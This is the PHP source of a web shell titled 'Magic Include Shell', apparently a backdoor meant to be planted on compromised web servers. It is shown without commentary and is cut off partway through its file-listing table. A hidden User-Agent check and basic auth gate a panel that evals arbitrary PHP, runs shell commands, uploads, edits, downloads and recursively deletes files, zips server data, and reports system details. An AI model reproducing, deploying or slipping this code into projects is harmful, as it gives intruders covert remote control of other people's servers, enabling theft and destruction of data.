
<?php
error_reporting(0);
$ver = '6.6.6';
$my_keyw = $_SERVER['HTTP_USER_AGENT'];
$items_per_page = 50;
$admin_name = '27a0e2015f9087981c0b95a29fc4ba57';
$admin_pass = '9413c48772f73d5c305b65eb58a06f9c';

if($my_keyw=='spaumbot')
{
if ((!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!=$admin_name || md5($_SERVER['PHP_AUTH_PW'])!=$admin_pass) && !eregi('cgi',PHP_SAPI))
   {
   header("WWW-Authenticate: Basic realm=\"SPAUM\"");
   header("HTTP/1.0 401 Unauthorized");
   exit('Access Denied');
   }
class zipfile 
{ 
    var $datasec      = array(); 
    var $ctrl_dir     = array(); 
    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00"; 
    var $old_offset   = 0; 
    function unix2DosTime($unixtime = 0) { 
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime); 
        if ($timearray['year'] < 1980) { 
            $timearray['year']    = 1980; 
            $timearray['mon']     = 1; 
            $timearray['mday']    = 1; 
            $timearray['hours']   = 0; 
            $timearray['minutes'] = 0; 
            $timearray['seconds'] = 0; 
        } 

        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) | 
                ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1); 
    } 
    function addDir($name) 
    { 
        $name = str_replace("\\", "/", $name); 
        $fr = "\x50\x4b\x03\x04"; 
        $fr .= "\x0a\x00"; 
        $fr .= "\x00\x00";   
        $fr .= "\x00\x00";  
        $fr .= "\x00\x00\x00\x00";
        $fr .= pack("V",0); 
        $fr .= pack("V",0); 
        $fr .= pack("V",0); 
        $fr .= pack("v", strlen($name) );
        $fr .= pack("v", 0 ); 
        $fr .= $name; 
        $fr .= pack("V",$crc); 
        $fr .= pack("V",$c_len); 
        $fr .= pack("V",$unc_len);  
        $this -> datasec[] = $fr; 
        $new_offset = strlen(implode("", $this->datasec)); 
        $cdrec = "\x50\x4b\x01\x02"; 
        $cdrec .="\x00\x00"; 
        $cdrec .="\x0a\x00";
        $cdrec .="\x00\x00";  
        $cdrec .="\x00\x00"; 
        $cdrec .="\x00\x00\x00\x00"; 
        $cdrec .= pack("V",0);
        $cdrec .= pack("V",0);
        $cdrec .= pack("V",0); 
        $cdrec .= pack("v", strlen($name) );
        $cdrec .= pack("v", 0 ); 
        $cdrec .= pack("v", 0 ); 
        $cdrec .= pack("v", 0 ); 
        $cdrec .= pack("v", 0 ); 
        $ext = "\x00\x00\x10\x00"; 
        $ext = "\xff\xff\xff\xff"; 
        $cdrec .= pack("V", 16 ); 
        $cdrec .= pack("V", $this -> old_offset ); 
        $this -> old_offset = $new_offset; 
        $cdrec .= $name; 
        $this -> ctrl_dir[] = $cdrec; 
    } 
    function addFile($data, $name, $time = 0) 
    { 
        $name     = str_replace('\\', '/', $name); 
        $name     = str_replace(array('../','./'), '', $name); 
        $dtime    = dechex($this->unix2DosTime($time)); 
        $hexdtime = '\x' . $dtime[6] . $dtime[7] 
                  . '\x' . $dtime[4] . $dtime[5] 
                  . '\x' . $dtime[2] . $dtime[3] 
                  . '\x' . $dtime[0] . $dtime[1]; 
        eval('$hexdtime = "' . $hexdtime . '";'); 
        $fr   = "\x50\x4b\x03\x04"; 
        $fr   .= "\x14\x00";     
        $fr   .= "\x00\x00"; 
        $fr   .= "\x08\x00";      
        $fr   .= $hexdtime;      
        $unc_len = strlen($data); 
        $crc     = crc32($data); 
        $zdata   = gzcompress($data); 
        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2); 
        $c_len   = strlen($zdata); 
        $fr      .= pack('V', $crc);          
        $fr      .= pack('V', $c_len);       
        $fr      .= pack('V', $unc_len);    
        $fr      .= pack('v', strlen($name));   
        $fr      .= pack('v', 0);               
        $fr      .= $name; 
        $fr .= $zdata;  
        $fr .= pack('V', $crc);   
        $fr .= pack('V', $c_len);      
        $fr .= pack('V', $unc_len);       
        $this -> datasec[] = $fr; 

        $cdrec = "\x50\x4b\x01\x02"; 
        $cdrec .= "\x00\x00";       
        $cdrec .= "\x14\x00";          
        $cdrec .= "\x00\x00";          
        $cdrec .= "\x08\x00";         
        $cdrec .= $hexdtime;               
        $cdrec .= pack('V', $crc);        
        $cdrec .= pack('V', $c_len);     
        $cdrec .= pack('V', $unc_len);      
        $cdrec .= pack('v', strlen($name) );
        $cdrec .= pack('v', 0 );     
        $cdrec .= pack('v', 0 );     
        $cdrec .= pack('v', 0 );       
        $cdrec .= pack('v', 0 );        
        $cdrec .= pack('V', 32 ); 
        $cdrec .= pack('V', $this -> old_offset );
        $this -> old_offset += strlen($fr); 
        $cdrec .= $name; 
        $this -> ctrl_dir[] = $cdrec; 
    } 

    function file() 
    { 
        $data    = implode('', $this -> datasec); 
        $ctrldir = implode('', $this -> ctrl_dir); 
        return 
            $data . 
            $ctrldir . 
            $this -> eof_ctrl_dir . 
            pack('v', sizeof($this -> ctrl_dir)) .  
            pack('v', sizeof($this -> ctrl_dir)) .  
            pack('V', strlen($ctrldir)) .       
            pack('V', strlen($data)) .    
            "\x00\x00";                      
    } 

    function addFiles($files) 
    { 
        foreach($files as $file) 
        { 
        if (is_file($file)) 
        { 
            $data = implode("",file($file)); 
                    $this->addFile($data,$file); 
                } 
        } 
    } 

    function output($file) 
    { 
        $fp=fopen($file,"w"); 
        fwrite($fp,$this->file()); 
        fclose($fp); 
    } 
} 
    class SimpleUnzip {
        var $Comment = '';
        var $Entries = array();
        var $Name = '';
        var $Size = 0;
        var $Time = 0;
        function SimpleUnzip($in_FileName = '')
        {
            if ($in_FileName !== '') {
                SimpleUnzip::ReadFile($in_FileName);
            }
        } 
        function Count()
        {
            return count($this->Entries);
        } 
        function GetData($in_Index)
        {
            return $this->Entries[$in_Index]->Data;
        } 
        function GetEntry($in_Index)
        {
            return $this->Entries[$in_Index];
        } 
        function GetError($in_Index)
        {
            return $this->Entries[$in_Index]->Error;
        } 
        function GetErrorMsg($in_Index)
        {
            return $this->Entries[$in_Index]->ErrorMsg;
        } 
        function GetName($in_Index)
        {
            return $this->Entries[$in_Index]->Name;
        }
        function GetPath($in_Index)
        {
            return $this->Entries[$in_Index]->Path;
        } 
        function GetTime($in_Index)
        {
            return $this->Entries[$in_Index]->Time;
        } 
        function ReadFile($in_FileName)
        {
            $this->Entries = array();        
            $this->Name = $in_FileName;
            $this->Time = filemtime($in_FileName);
            $this->Size = filesize($in_FileName);          
            $oF = fopen($in_FileName, 'rb');
            $vZ = fread($oF, $this->Size);
            fclose($oF);
            $aE = explode("\x50\x4b\x05\x06", $vZ);       
            $aP = unpack('x16/v1CL', $aE[1]);
            $this->Comment = substr($aE[1], 18, $aP['CL']);           
            $this->Comment = strtr($this->Comment, array("\r\n" => "\n","\r"   => "\n"));
            $aE = explode("\x50\x4b\x01\x02", $vZ);     
            $aE = explode("\x50\x4b\x03\x04", $aE[0]);           
            array_shift($aE);  
            foreach ($aE as $vZ) {
                $aI = array();
                $aI['E']  = 0;
                $aI['EM'] = '';
                $aP = unpack('v1VN/v1GPF/v1CM/v1FT/v1FD/V1CRC/V1CS/V1UCS/v1FNL', $vZ);
                $bE = ($aP['GPF'] && 0x0001) ? TRUE : FALSE;
                $nF = $aP['FNL'];
                if ($aP['GPF'] & 0x0008) {
                    $aP1 = unpack('V1CRC/V1CS/V1UCS', substr($vZ, -12));
                    $aP['CRC'] = $aP1['CRC'];
                    $aP['CS']  = $aP1['CS'];
                    $aP['UCS'] = $aP1['UCS'];
                    $vZ = substr($vZ, 0, -12);
                }
                $aI['N'] = substr($vZ, 26, $nF);
                if (substr($aI['N'], -1) == '/') {
                    continue;
                }
                $aI['P'] = dirname($aI['N']);
                $aI['P'] = $aI['P'] == '.' ? '' : $aI['P'];
                $aI['N'] = basename($aI['N']);
                $vZ = substr($vZ, 26 + $nF);
                if (strlen($vZ) != $aP['CS']) {
                  $aI['E']  = 1;
                  $aI['EM'] = 'Compressed size is not equal with the value in header information.';
                } else {
                    if ($bE) {
                        $aI['E']  = 5;
                        $aI['EM'] = 'File is encrypted, which is not supported from this class.';
                    } else {
                        switch($aP['CM']) {
                            case 0: 
                                break;
                            case 8:
                                $vZ = gzinflate($vZ);
                                break;
                            case 12: 
                                if (! extension_loaded('bz2')) {
                                    if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN') {
                                      @dl('php_bz2.dll');
                                    } else {
                                      @dl('bz2.so');
                                    }
                                }
                                if (extension_loaded('bz2')) {
                                    $vZ = bzdecompress($vZ);
                                } else {
                                    $aI['E']  = 7;
                                    $aI['EM'] = "PHP BZIP2 extension not available.";
                                }
                                break;
                            default:
                              $aI['E']  = 6;
                              $aI['EM'] = "De-/Compression method {$aP['CM']} is not supported.";
                        }
                        if (! $aI['E']) {
                            if ($vZ === FALSE) {
                                $aI['E']  = 2;
                                $aI['EM'] = 'Decompression of data failed.';
                            } else {
                                if (strlen($vZ) != $aP['UCS']) {
                                    $aI['E']  = 3;
                                    $aI['EM'] = 'Uncompressed size is not equal with the value in header information.';
                                } else {
                                    if (crc32($vZ) != $aP['CRC']) {
                                        $aI['E']  = 4;
                                        $aI['EM'] = 'CRC32 checksum is not equal with the value in header information.';
                                    }
                                }
                            }
                        }
                    }
                }
                $aI['D'] = $vZ;
                $aI['T'] = mktime(($aP['FT']  & 0xf800) >> 11,
                                  ($aP['FT']  & 0x07e0) >>  5,
                                  ($aP['FT']  & 0x001f) <<  1,
                                  ($aP['FD']  & 0x01e0) >>  5,
                                  ($aP['FD']  & 0x001f),
                                  (($aP['FD'] & 0xfe00) >>  9) + 1980);
                $this->Entries[] = &new SimpleUnzipEntry($aI);
            }
            return $this->Entries;
        } 
    } 
    class SimpleUnzipEntry {
        var $Data = '';
        var $Error = 0;
        var $ErrorMsg = '';
        var $Name = '';
        var $Path = '';
        var $Time = 0;
        function SimpleUnzipEntry($in_Entry)
        {
            $this->Data     = $in_Entry['D'];
            $this->Error    = $in_Entry['E'];
            $this->ErrorMsg = $in_Entry['EM'];
            $this->Name     = $in_Entry['N'];
            $this->Path     = $in_Entry['P'];
            $this->Time     = $in_Entry['T'];
        } 
    }
 function unzipFile($filename, $destination_folder) {                                                  
        if (substr($destination_folder, -1) != '/') {                                                
            $destination_folder = $destination_folder .'/';                                                   
        }                                                                                                                
     $vzip = new SimpleUnzip($filename);
          foreach ($vzip->Entries as $extr) {         
              $path = $extr->Path;
              $path_folder = explode ('/', $path);
              $new_path = '';              
                  foreach ($path_folder as $folder) {                 
                      $new_path .= $folder .'/';                 
                      $to_create = $destination_folder . $new_path;                     
                          if (substr($to_create, -1) == '/') {                         
                            $to_create = substr($to_create, 0, strlen($to_create)-1);                         
                          }              
                      @mkdir($to_create, 0777);                 
                  }        
              $new_path = '';
              $filev = fopen ($destination_folder. $extr->Path .'/'. $extr->Name, 'w');
              fwrite ($filev, $extr->Data);
              fclose ($filev);                                                        
          }                                                                 
  }
 function dd($file) 
	{
	 if (is_dir($file) || is_file($file)) 
		{
 		chmod($file,0777);
		 if (is_dir($file)) 
			{
 			$handle = opendir($file); 
 			while($filename = readdir($handle)) 
 			if ($filename != "." && $filename != "..") 
				dd($file."/".$filename);
 			closedir($handle);
 			if(@rmdir($file))
				print "$file deleted!<br/>";
			else
				print "$file delete error!<br/>";
 			}
		 else 
			{
 			if(@unlink($file))
				print "$file deleted!<br/>";
			else
				print "$file delete error!<br/>";
 			}
		 }

 	} 
 function add2zipfile($file) 
	{
	 if (file_exists($file)) 
		{
 		chmod($file,0777);
		 if (is_dir($file)) 
			{
 			$handle = opendir($file); 
 			while($filename = readdir($handle)) 
 			if ($filename != "." && $filename != "..") 
				{
				$archive.=add2zipfile(rtrim($file,'/').'/'.$filename).',:,';
				//$archive.=rtrim($file,'/').'/'.$filename.',:,';
				}
 			closedir($handle);
 			return $archive;
 			}
		 else 
			{
 			$archive.=$file;
 			return $archive;
 			}
		 }
 	}  
    function U_sapi() 
    { 
        switch(PHP_SAPI) 
        { 
            case 'apache2handler': return 'Apache 2.0 Handler'; 
            case 'apache': return 'Apache'; 
            case 'cgi': return 'CGI'; 
            case 'cgi-fcgi': return 'CGI/FastCGI'; 

            default: return PHP_SAPI; 
        } 
    } 
    function U_getos() 
    { 
        if (function_exists('php_uname')) return php_uname(); 
        if (PHP_OS == 'WINNT') 
        return 'Windows NT'; 
        return PHP_OS; 
    }

function func_download_file($filepath, $mimetype = 'application/octet-stream') 
{  
    $fsize = filesize($filepath);
    $ftime = date('D, d M Y H:i:s T', filemtime($filepath));
    $fd = @fopen($filepath, 'rb');
    if (isset($_SERVER['HTTP_RANGE'])) { 
        $range = $_SERVER['HTTP_RANGE']; 
        $range = str_replace('bytes=', '', $range);  
        list($range, $end) = explode('-', $range);  
  
        if (!empty($range)) {  
            fseek($fd, $range);  
        }  
    } else { 
        $range = 0;  
    }  
  
    if ($range) {  
        header($_SERVER['SERVER_PROTOCOL'].' 206 Partial Content');
    } else {  
        header($_SERVER['SERVER_PROTOCOL'].' 200 OK'); 
    }  

    header('Content-Disposition: attachment; filename='.basename($filepath));  
    header('Last-Modified: '.$ftime);  
    header('Accept-Ranges: bytes');  
    header('Content-Length: '.($fsize - $range));  
    header("Content-Range: bytes $range-".($fsize - 1).'/'.$fsize);  
    header('Content-Type: '.$mimetype);  
    header('Content-transfer-encoding: binary');  
  
    fpassthru($fd); 
    fclose($fd);  
  
    exit;  
}  

class mimetype {
   function getType($filename) {
      $filename = basename($filename);

      $filename = explode('.', $filename);
      $filename = $filename[count($filename)-1];   
      return $this->privFindType($filename);
   }

   function privFindType($ext) {
      $mimetypes = $this->privBuildMimeArray();  
      if (isset($mimetypes[$ext])) {
         return $mimetypes[$ext];      
      } else {
         return 'application/octet-stream';
      }   
   }
   function privBuildMimeArray() {
      return array(
         "doc" => "application/msword",
         "pdf" => "application/pdf",
         "swf" => "application/x-shockwave-flash",
         "xhtml" => "application/xhtml+xml",
         "zip" => "application/zip",
         "mid" => "audio/midi",
         "midi" => "audio/midi",
         "mp2" => "audio/mpeg",
         "mp3" => "audio/mpeg",
         "aif" => "audio/x-aiff",
         "aiff" => "audio/x-aiff",
         "aifc" => "audio/x-aiff",
         "m3u" => "audio/x-mpegurl",
         "wav" => "audio/x-wav",
         "bmp" => "image/bmp",
         "gif" => "image/gif",
         "ief" => "image/ief",
         "jpeg" => "image/jpeg",
         "jpg" => "image/jpeg",
         "jpe" => "image/jpeg",
         "png" => "image/png",
         "tiff" => "image/tiff",
         "tif" => "image/tif",
         "djvu" => "image/vnd.djvu",
         "djv" => "image/vnd.djvu",
         "wbmp" => "image/vnd.wap.wbmp",
         "css" => "text/css",
         "html" => "text/html",
         "htm" => "text/html",
         "txt" => "text/plain",
         "php" => "text/plain",
         "phtml" => "text/plain",
         "asp" => "text/plain",
         "cgi" => "text/plain",
         "rtf" => "text/rtf",
         "wml" => "text/vnd.wap.wml",
         "wmls" => "text/vnd.wap.wmlscript",
         "xml" => "text/xml",
         "xsl" => "text/xml",
         "mpeg" => "video/mpeg",
         "mpg" => "video/mpeg",
         "mov" => "video/quicktime",
         "avi" => "video/x-msvideo",
         "movie" => "video/x-sgi-movie",
      );
   }
}

function show_cwd($dir)
	{
	$dir = explode('/',$dir);
	if(empty($dir[0]))
		{
		$mydir = '/';
		print '/';
		}
	else
		$mydir = '';
	for($i=0;$i<count($dir);$i++)
		{
		if(!empty($dir[$i]))
			{
			$mydir .= $dir[$i].'/';
			print "<a href='#' onclick=\"document.todo.dira.value='$mydir';document.todo.submit();\">{$dir[$i]}</a>/";
			}
		}
	}

function my_stat($myfile)
{
if(function_exists(posix_getpwuid))
	{
	$my_owner = posix_getpwuid(fileowner($myfile));
	$my_owner = $my_owner[name];
	}
else
	$my_owner = fileowner($myfile);
if(function_exists(posix_getgrgid))
	{
	$my_group = posix_getgrgid(filegroup($myfile));
	$my_group = $my_group[name];
	}
else
	$my_group = filegroup($myfile);
return '<font color="#00ff00">'.$my_owner.':'.$my_group.'</font> '.date ("M d Y H:i:s", filemtime($myfile));
}

function my_perms($myfile)
{
$perms = fileperms($myfile);

if (($perms & 0xC000) == 0xC000) {
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    $info = 'p';
} else {
    $info = 'u';
}
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));
return '<i>'.$info.'</i>';
}

if(!empty($_POST[dofile]))
	{
	$dofile = $_POST['dira'].$_POST[dofile];
	$_POST[dofile] = NULL;
	unset($_POST[dofile]);
      	$mimetype = new mimetype();
      	$mymim=$mimetype->getType($dofile);
	func_download_file($dofile,$mymim);
	}

$site=$PHP_SELF;

header("Content-type: text/html");
$file2zip=$_POST['file2zip'];
$deldira=$_POST['deldira'];
$arhiv=$_POST['arhiv'];

$dira=$_POST['dira'];

if(!empty($dira) && isset($dira)) chdir($dira);
$dira=str_replace('\\','/',getcwd());

if(!ereg("/$",$dira)) $dira=$dira.'/';
$comanda=$_POST['comanda'];
$shcom=$_POST['shcom'];

if(isset($_POST['filee']) && !empty($_POST['filee']))
$filee=$dira.''.$_POST['filee'];

$uploadfile=$_POST['uploadfile'];
$uploaddir=$_POST['uploaddir'];
$del=$_POST[del];

if(isset($_POST['edit']) && !empty($_POST['edit']))
$edit=$_POST['edit'];

$save_edit=$_POST[save_edit];

$kverya = rtrim(str_replace(array($my_keyw,'&&'),'',$_SERVER["QUERY_STRING"]),'&');
?>
<html>
<head>
<title>Magic Include Shell <?php echo $ver; ?></title>
<STYLE fprolloverstyle>
A{COLOR: #00ff00;}
INPUT {BORDER-LEFT-COLOR: #000000; BACKGROUND: #000000; BORDER-BOTTOM-COLOR: #000000; FONT: 12px Verdana, Arial, Helvetica, sans-serif; COLOR: #00ff00; BORDER-TOP-COLOR: #000000; BORDER-RIGHT-COLOR: #000000}
TEXTAREA {BORDER-LEFT-COLOR: #000000; BACKGROUND: #000000; BORDER-BOTTOM-COLOR: #000000; FONT: 12px Verdana, Arial, Helvetica, sans-serif; COLOR: #00ff00; BORDER-TOP-COLOR: #000000; BORDER-RIGHT-COLOR: #000000}
</STYLE>
</head>
<SCRIPT language=Javascript><!--
function checkAll(form)
{
	for (i = 0, n = form.elements.length; i < n; i++) {
		if(form.elements[i].id == "delete_id") {
			if(form.elements[i].checked == true)
				form.elements[i].checked = false;
			else
				form.elements[i].checked = true;
		}
	}
}
function checkAll2(form)
{
	for (i = 0, n = form.elements.length; i < n; i++) {
		if(form.elements[i].id == "zip_id") {
			if(form.elements[i].checked == true)
				form.elements[i].checked = false;
			else
				form.elements[i].checked = true;
		}
	}
}
function checkAll3(form)
{
	for (i = 0, n = form.elements.length; i < n; i++) {
		if(form.elements[i].id == "unzip_id") {
			if(form.elements[i].checked == true)
				form.elements[i].checked = false;
			else
				form.elements[i].checked = true;
		}
	}
}

function MultiSelector( list_target, max ){
	this.list_target = list_target;
	this.count = 0;
	this.id = 0;
	if( max ){this.max = max;} else {this.max = -1;};
	this.addElement = function( element ){
		if( element.tagName == 'INPUT' && element.type == 'file' ){
			element.name = 'file_' + this.id++;
			element.multi_selector = this;
			element.onchange = function(){
				var new_element = document.createElement( 'input' );
				new_element.type = 'file';
				this.parentNode.insertBefore( new_element, this );
				this.multi_selector.addElement( new_element );
				this.multi_selector.addListRow( this );
				this.style.position = 'absolute';
				this.style.left = '-1000px';
			};
			if( this.max != -1 && this.count >= this.max ){
				element.disabled = true;
			};
			this.count++;
			this.current_element = element;	
		} else {
			alert( 'Error: not a file input element' );
		};};
	this.addListRow = function( element ){
		var new_row = document.createElement( 'div' );
		var new_row_button = document.createElement( 'input' );
		new_row_button.type = 'button';
		new_row_button.value = 'Delete';


		new_row.element = element;

		new_row_button.onclick= function(){
			this.parentNode.element.parentNode.removeChild( this.parentNode.element );
			this.parentNode.parentNode.removeChild( this.parentNode );
			this.parentNode.element.multi_selector.count--;
			this.parentNode.element.multi_selector.current_element.disabled = false;
			return false;
		};
		new_row.innerHTML = element.value;
		new_row.appendChild( new_row_button );
		this.list_target.appendChild( new_row );};};
//--></SCRIPT>
<body text=#ffffff bgColor=#000000>
<table width="100%" border="1" cellspacing="0" cellpadding="4"><tr>
<td valign="top">

<form name='todo' method='POST' action="<?php print "$site?$kverya"; ?>">
<input name='dira' type='hidden' value=''>
<input name='filee' type='hidden' value=''>
<input name='edit' type='hidden' value=''>
<input name='dofile' type='hidden' value=''>
<input name='page' type='hidden' value=''>
<input name='<?php print $my_keyw; ?>' type='hidden' value=''>
</form>

<input name='dira' type='hidden' value='<?php print $dira; ?>'>
<input name='<?php print $my_keyw; ?>' type='hidden' value=''>
<?php print 'Server: ';
print U_sapi();
if(function_exists('apache_get_version'))
	print ' ['.apache_get_version().']';
print '<br/>';
print '<hr/>System: ';
print U_getos();
print '<br/><hr/>';
print 'Php version: '.PHP_VERSION.' | Safe mode: '.(ini_get('safe_mode') ? 'On' : 'Off').' | User: '.get_current_user().' ('.getmyuid().':'.getmygid().')<br/><hr/>';
print 'Hostname:Port: '.$_SERVER['SERVER_NAME'].':'.$_SERVER['SERVER_PORT'];

?>
<hr/>

<script>	function EditDir(){
		var editdir=document.getElementById('editdir');
		var navdir=document.getElementById('navdir');

		if (editdir.style.display=="none") {
			editdir.style.display="inline";
			navdir.style.display="none";
		} 
		else {
			editdir.style.display="none";
			navdir.style.display="inline";
		}

	}</script>

<div id="editdir" style="display:none">
<form method="POST" action="<?php print "$site?$kverya"; ?>">
<a style="text-decoration: none" href="javascript:EditDir()">Dir: </a><input name='dira' size=64 value='<?php print $dira; ?>'> <input type="submit" value="Go!"/>

<input name='<?php print $my_keyw; ?>' type='hidden' value=''>
</form>
</div>
<div id="navdir">
<a style="text-decoration: none" href="javascript:EditDir()">Dir: </a>
<?php
show_cwd($dira);
?>
</div>
</td>
<td>
<form method="POST" action="<?php print "$site?$kverya"; ?>">
<input name='dira' type='hidden' value='<?php print $dira; ?>'>
<input name='<?php print $my_keyw; ?>' type='hidden' value=''>
<input name='page' type='hidden' value='<?php print $page; ?>'>
Php eval:<br/>
<textarea name="comanda" rows=10 cols=80></textarea><br/>
<input type="submit" value="eval"/>
</form>
</td><td>
<form method="POST" action="<?php print "$site?$kverya"; ?>">
<input name='dira' type='hidden' value='<?php print $dira; ?>'>
<input name='page' type='hidden' value='<?php print $page; ?>'>
<input name='<?php print $my_keyw; ?>' type='hidden' value=''>
Shell command:<br/><input name="shcom"><br/>
<input type="submit" value="shell"/>
</form>
<form enctype="multipart/form-data" action="<?php print "$site?$kverya"; ?>" method="post">
<input name='page' type='hidden' value='<?php print $page; ?>'>
<input name='dira' type='hidden' value='<?php print $dira; ?>'>
<input name='<?php print $my_keyw; ?>' type='hidden' value=''>
 <input type="hidden" name="MAX_FILE_SIZE" value="30000000" />
 Files to upload:<br/><input name="uploadfile" id="my_file_element"  type="file" />
<br/>Dir to upload:<br/><input name="uploaddir" value="<?php print $dira; ?>"/><br/>
 <input type="submit" value="Send File" />
<br/>
<div id="files_list"></div>
<script>
	var multi_selector = new MultiSelector( document.getElementById( 'files_list' ), 999);
	multi_selector.addElement( document.getElementById( 'my_file_element' ) );
</script>
</form>
</td>
</tr>
</table>
<?php
if(!empty($file2zip) && is_array($file2zip) && isset($_POST[zip_path]) && isset($_POST[zip_submit]))
{
$ziper = new zipfile();
for($k=0;$k<count($file2zip);$k++)
{
$ziparc=str_replace(',:,,:,',',:,',add2zipfile(rtrim($dira,'/').'/'.$file2zip[$k]));
$ziparc=explode(',:,',$ziparc);
for($i=0;$i<count($ziparc);$i++)
{
if(!empty($ziparc[$i]))
	{
	if(is_dir($ziparc[$i]))
		{
		$ziper->addDir($ziparc[$i]);
		print "{$ziparc[$i]} added!<br/>";
		}
	elseif(is_file($ziparc[$i]))
		{
		$name2add=explode('../',$ziparc[$i]);
		$name2add=$name2add[count($name2add)-1];
		$ziper->addFile(file_get_contents($ziparc[$i]),$name2add);
		print "{$ziparc[$i]} added!<br/>";
		}
	}
}
}
$ziper->output($_POST[zip_path]);
}

if(!empty($deldira) && is_array($deldira) && isset($_POST[delete_submit]))
{
for($i=0;$i<count($deldira);$i++)
	{
	dd($deldira[$i]);
	}
}

if(!empty($arhiv) && is_array($arhiv) && isset($_POST[unzip_path]) && isset($_POST[unzip_submit]))
{
for($i=0;$i<count($arhiv);$i++)
{
unzipFile(rtrim($dira,'/').'/'.$arhiv[$i],$_POST[unzip_path]);
}
}
if(!empty($comanda))
{
eval(trim(stripslashes($comanda)));
}
if(!empty($shcom))
{
print '<pre>'.`$shcom`.'</pre>';
}

reset ($_FILES);
while (list ($clave, $val) = each ($_FILES)) {
if(!empty($val['name']))
{
if(move_uploaded_file($val['tmp_name'], $uploaddir.'/'.$val['name']))
	print "<b>{$val['name']}</b> ({$val['size']} bytes) uploaded succesfully!<br/>";
else
	print "<b>Upload error!</b> ({$val['error']})<br/>";
}
}

if(!empty($del) && is_array($del) && isset($_POST[delete_submit]))
{
for($i=0;$i<count($del);$i++)
	{
	unlink($dira.$del[$i]);
	print '<b>'.$del[$i].' deleted succesfully!</b><br/>';
	}
}

if(!empty($filee))
{
?>
<pre>

<?php
$filee=file_get_contents($filee);
if(ereg('<\?',$filee))
	print str_replace(array('#000000'),array('#FFFFFF'),highlight_string($filee,true));
else
	print $filee;
?>
</pre>
<?php
}

if(!empty($edit) && empty($save_edit))
{
?>
<form method="POST" action="<?php print "$site?$kverya"; ?>">
<input name='page' type='hidden' value='<?php print $page; ?>'>
<input name='dira' type='hidden' value='<?php print $dira; ?>'>
<input name='<?php print $my_keyw; ?>' type='hidden' value=''>
<b><?php print $edit; ?></b><br/>
<textarea name="save_edit" rows=20 cols=141>
<?php
$fss = @ fopen($dira.$edit, 'r');
print htmlspecialchars(fread($fss, filesize($dira.$edit)));
fclose($fss);
?>
</textarea><br/>
<input type="hidden" value="<?php print $edit ?>" name="edit"/>
<input type="submit" value="edit"/>

</form>
<?php

}
elseif(!empty($edit) && !empty($save_edit))
	{
	$fp=fopen($dira.$edit,"w");
	if ( get_magic_quotes_gpc() )
		{
		$save_edit=stripslashes($save_edit);
		}
	fputs($fp,$save_edit);
	fclose($fp);
	print "<b>$edit edited succesfully!</b><br/>";
	}

if(!($dp = opendir($dira))) die ("Cannot open ./");

$page = isset($_POST[page]) ? (int) $_POST[page] : 0;


$last_record = $page + $items_per_page;
$file_array = array(); 
while ($file = readdir ($dp))
	{
		$file_array[] =  $file;
	}
$file_count = count ($file_array);
sort ($file_array);


$total_pages = ceil($file_count/$items_per_page);
$pageof = (($page+$items_per_page)/$items_per_page);


if(($page+$items_per_page)>$items_per_page)
	{
	print "<a href='#' onclick=\"document.todo.dira.value='$dira';document.todo.page.value='".($page-$items_per_page)."';document.todo.submit();\">&lt;&lt;</a>";
	}
else
	print "&lt;&lt;";

print '|'.$pageof.' of '.$total_pages.'|';
if(($page+$items_per_page)<$file_count)
	{
	print "<a href='#' onclick=\"document.todo.dira.value='$dira';document.todo.page.value='".($last_record)."';document.todo.submit();\">&gt;&gt;</a>";
	}
else
	print "&gt;&gt;";

print '<script>	function ZipDir(){
		var zipdir1=document.getElementById(\'zipdir1\');
		var zipdir2=document.getElementById(\'zipdir2\');

		if (zipdir1.style.display=="none") {
			zipdir1.style.display="inline";
			zipdir2.style.display="none";
		} 
		else {
			zipdir1.style.display="none";
			zipdir2.style.display="inline";
		}
	}
function UnZipDir(){
		var unzipdir1=document.getElementById(\'unzipdir1\');
		var unzipdir2=document.getElementById(\'unzipdir2\');

		if (unzipdir1.style.display=="none") {
			unzipdir1.style.display="inline";
			unzipdir2.style.display="none";
		} 
		else {
			unzipdir1.style.display="none";
			unzipdir2.style.display="inline";
		}
	}
</script>';

print '<form id="list_form" method="POST" action="'.$site.'?'.$kverya.'"><table width="100%" border="1" cellspacing="0" cellpadding="4">
<input name="dira" type="hidden" value="'.$dira.'">
<input name="'.$my_keyw.'" type="hidden" value=""/>
<tr> 
<th bgcolor="gray">Name | Size | Perms</th>
<th bgcolor="gray" width=30%>Owner:Group | Last mod</th>
<th bgcolor="gray" width=2%>Edit</th>
<th bgcolor="gray" width=2%>Dload</th>
<th bgcolor="gray" width=6%><input type="checkbox" onclick="checkAll(document.getElementById(\'list_form\'));" /> <input type="submit" value="Del" name="delete_submit"/></th>
<th bgcolor="gray" width=10%><span id="zipdir1"><input type="checkbox" onclick="checkAll2(document.getElementById(\'list_form\'));" /> <input type="submit" value="Zip" name="zip_submit"/></span> <a style="text-decoration: none;color:white" href="javascript:ZipDir()">to</a> <span style="display:none" id="zipdir2"><input size=12 name="zip_path" value="'.$dira.'1.zip"/></span></th>
